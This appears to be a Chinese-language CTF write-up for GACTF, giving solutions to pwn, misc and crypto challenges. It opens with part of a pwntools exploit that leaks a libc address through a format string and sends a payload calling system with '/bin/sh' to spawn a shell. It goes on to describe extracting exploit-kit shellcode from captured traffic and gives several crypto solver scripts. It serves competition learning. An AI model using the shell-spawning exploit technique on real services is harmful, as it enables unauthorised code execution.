        sl('2')
        sla('username:','root')
        # raw_input()?
        sa(' password:','a'*16)
        # ia()
        # sl('2')
        # sla('username:','root')
        # # raw_input()?
        # sa(' password:','\x00'*16)
        sla('You can input token:','%15$p')
        sla('4:Logout','2')
        ru('0x')
        lbase=int('0x'+rv(8),16)-0xff71a4df+0xff6cb000
        success('lbase:'+hex(lbase))
        binsh=lbase+876332
        sleep(1)
        sl('3')
        sleep(1)
        sl('3')
        sleep(0.5)
        sl(p32(lbase+0x5919c)*10+p32(binsh)+p32(0)+p32(lbase+libc.sym['system']))
        cn.interactive()
###  RIG
> RIG是一个小有名气的黑客，圈内人都叫他exploit
> kid。RIG最近开发出了一套攻击工具包，利用浏览器漏洞在网络上兴风作浪。作为一个安全工程师的你，需要从捕获到的报文中找到RIG的攻击流量，从攻击流量中找到RIG使用的shellcode，提交shellcode的前13个字节的大写hex数据作为flag,温馨提示,请勿轻易运行哦:)
9795包处有一个巨大的HTTP响应包  
其中包含恶意js代码，  
用ie调试，点击console的错误信息，得到被解密的一层js代码，其中有一段base64，解密得到vb脚本，其中`getegeheteegegegege()`函数疑似获取shellcode
`str`变量即为hex过的shellcode，获得flag
###  crymisc
> 8.25 is Chinese Valentine’s Day.Yesterday my brother told me he was refused
> by a beautiful girl.He was sooooooooooooo sad and bursted into tears.
下下来的文件是zip，有伪加密，改了就ok  
解出一个txt和一个jpg，jpg末尾跟着的字符串是base64
然后还有个zip，需要肉眼识别然后改个`50 4B`文件头  
解压得到另一个txt
    🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕
codemoji的cracker  
`WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}`
###  capture
    截获到的虚拟世界到现实世界的消息
    message captured from virtual world to real world
DM/PL protocol  
脚本有点小问题，单纯一行U或D读不出来，就把对应的换成前一行的坐标就行了。
    import turtle
    f=open(r'P:\Downloads\captured.txt','r')
    for i in range(17):
        f.readline()
    turtle.screensize(800000,600000, "green")
    # turtle.setup(width=0.6,height=0.6)
    # turtle.pendown()
    # turtle.goto(3,39)
    # turtle.goto(300,239)
    # turtle.penup()
    turtle.speed(10)
    # for i in range(500):
            # f.readline()
            # f.readline()
            # f.readline()
            # f.readline()
            # f.readline()
    # try:
    if(1):
        while(1):
            cur=f.readline()[46:].split("\r\n")[0][2:-1]
            if(len(cur)
根据题目提示，bell 202 编码，寻找可以读取的软件  
运行 直接出flag
###  trihistory
docker pull impakho/trihistory:latest
下载镜像的同时去Docker Hub上查一查dockerfile
换了apt源，又装了个nginx，可能nginx的www里有东西
直接docker save，把各OSI层拽出来看看
01da3848ca6779c0bd598f39d6f95207af92b91be77f97d3f5f21d7d0b202aae层里确实有/var/www/html/flag.html，但是只有个flag
is removed
OSI层148ba1e1d9b5e9970fd2cab3ce9ca0c2d3343504d4af27603a0e1bb9543b13ba，发现root下有一histry文件夹，里面是用git做版本控制的目录
所以查看一下git histroy，reset到47a5ffbd63f271bc627af973d7a949232cfb47c6
之后wwwroot下有.flag.html.swp，看一下Hex就行
## crypto
###  da Vinci after rsa
    pa = 9749
    pb = 11237753507624591
    pc = 9127680453986244150392840833873266696712898279308227257525736684312919750469261
    mas = GF(pa)(c).nth_root(5, all=True)
    mbs = GF(pb)(c).nth_root(5, all=True)
    mcs = GF(pc)(c).nth_root(5, all=True)
    ms = [] 
    for ma, mb, mc in itertools.product(mas, mbs, mcs): 
        m = ZZ(crt(list(map(ZZ,[ma,mb,mc])), [pa,pb,pc]))
        assert power_mod(m, e, n) == c
        ms.append(m)
rsa 解出来 `flag{weadfa9987_adwd23123_454f}`
    key = [1,28657,2,1,3,17711,5,8,13,21,46368,75025,34,55,89,610,377,144,233,1597,2584,4181,6765,10946,987]
    fb = [1,1,2,3,5,8,13,21,34,55,89,144,233,377,610,987,1597,2584,4181,6765,10946,17711,28657,46368,75025]
    c = b'weadfa9987_adwd23123_454f'
    t0 = list(map(fb.index, key))
    t1 = t0[:]
    t0[t0.index(0)] = 1
    t1[t1.index(0, t1.index(0)+1)] = 1
    assert set(t0) == set(t1) == set(range(25))
    bytes([c[t0[i]] for i in range(25)])
    bytes([c[t1[i]] for i in range(25)])
###  elgaml_rsa
看不出来咋分解 `secret`
`assert(len(flag)==36)` 有点突兀, 可能有用
验证了下 `secret` 确实是 `key.py` 里那个
代码很像 2018 Code Blue lagalem  
md, yafu直接分解, 前面一大串 elgamal 是个啥子
    factors = [(42044128297, 6), (653551912583, 15), (104280142799213, 6), (28079229001363, 14), (232087313537, 5), (802576647765917, 7)]
    for prime, order in factors:
        assert isPrime(prime)
        assert n % (prime**order) == 0
        n //= prime**order
    assert n == 1
    res = []
    for prime, order in factors:
        mod = prime**order
        phi = prime**order - prime**(order-1)
        g = gcd(e, phi)
        print(g, mod.bit_length())
        if g == 2:
            m2 = pow(c%mod, invert(e//g, phi), mod)
            res.append((m2, mod))
    m2 = crt([res[0][0],res[1][0]], [res[0][1], res[1][1]])
    m = ZZ(sqrt(m2))
    print(bytes.fromhex(hex(m).strip('0x')))
###  what_r_the_noise
看起来正态分布
    r = remote('124.71.145.165', 9999)
    def f():
        r.sendlineafter(':', '2')
        data = r.recvline().decode().strip()
        return eval('[' + data + ']')
    data = []
    for _ in range(100):
        data.append(f())
    rnd_data = [round(sum([data[i][j] for i in range(len(data))])/len(data)) for j in range(len(data[0]))]
    print(bytes(rnd_data))
会有点偏差, 但全英文, 相邻的字母试试就出了
###  ezAES
爆个 key, 解个cbc就好了
    import itertools
    from Crypto.Util.strxor import strxor
    def chunks(data, bs=16):
        return [data[i:i+bs] for i in range(0, len(data), bs)]
    cipher = 'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'.replace('*', '0')
    cs = chunks(bytes.fromhex(cipher))
    key0 = b'T0EyZaLRzQmNe2'
    def decrypt_block(data):
        global key
        assert len(data) == 16
        aes = AES.new(key, AES.MODE_ECB)
        return aes.decrypt(data)
    for a,b in itertools.product(range(256), repeat=2):
        key = key0 + bytes([a, b])
        h = hashlib.md5(key).hexdigest()
        SECRET = binascii.unhexlify(h)[:10]
        message = b'AES CBC Mode is commonly used in data encryption. What do you know about it?'+SECRET
        message = pad(message)
        ms = chunks(message)
        if strxor(decrypt_block(cs[-1]), ms[-1])[-8:] == cs[-2][-8:]:
            print(key)
            break
    for i in reversed(range(1, len(cs))):
        print(i-1, i)
        cs[i-1] = strxor(decrypt_block(cs[i]), ms[i])
    iv = strxor(decrypt_block(cs[0]), ms[0])
    print('gactf{%s}' % iv.decode())
###  square
转换成 pell equation `(4y+3)^2 - 48x^2 = 1`
    def pellsD(d):
        continuedFraction = []
        ao = floor(numerical_approx(sqrt(d)))
        decimal = numerical_approx(sqrt(d)) - floor(numerical_approx(sqrt(d)))
        continuedFraction.append(ao)
        finished = False
        while finished == False:
            continuedFraction.append(floor(numerical_approx(Integer(1)/decimal)))
            if floor(numerical_approx(Integer(1)/decimal)) == Integer(2)*ao:
                finished = True
            else:
                decimal = Integer(1)/decimal - floor(Integer(1)/decimal)
        pList = [Integer(0),Integer(1)]
        qList = [Integer(1),Integer(0)]
        for i in continuedFraction:
            p = i*pList[-Integer(1)] + pList[-Integer(2)]
            pList.append(p)
            q = i*qList[-Integer(1)] + qList[-Integer(2)]
            qList.append(q)
        if (pList[-Integer(2)]**Integer(2)) - d*(qList[-Integer(2)]**Integer(2)) == -Integer(1):
            x = (pList[-Integer(2)]**Integer(2))+(qList[-Integer(2)]**Integer(2))*(d)
            y = Integer(2)*(pList[-Integer(2)])*(qList[-Integer(2)])
            return {'x': x, 'y': y}
        else:
            return {'x': pList[-Integer(2)], 'y': qList[-Integer(2)]}
    data = []
    res = list(pellsD(48).values())
    k = res[0]
    l = res[1]
    lD = l * a
    while len(data) ] x: ', str(x))
        r.sendlineafter('[>] y: ', str(y))
    r.interactive()
###  babycrypto
看起来像 diffie hellman over complex number
p 都不给咋整? 可能 mov?
m0leCon CTF 2020 Teaser — King Exchange
    p = gcd(A[0]^2 + A[1]^2 - 1, B[0]^2 + B[1]^2 - 1)
    p = factor(p)[-1][0]
    assert is_prime(p)
    F = GF(p)
    R. = PolynomialRing(F)
    K. = F.extension(w^2 + 1)
    g_K = g[0] + g[1]*w
    B_K = B[0] + B[1]*w
    b = discrete_log(B_K, g_K)
    print(b)
    print(multiply(g, b) == B)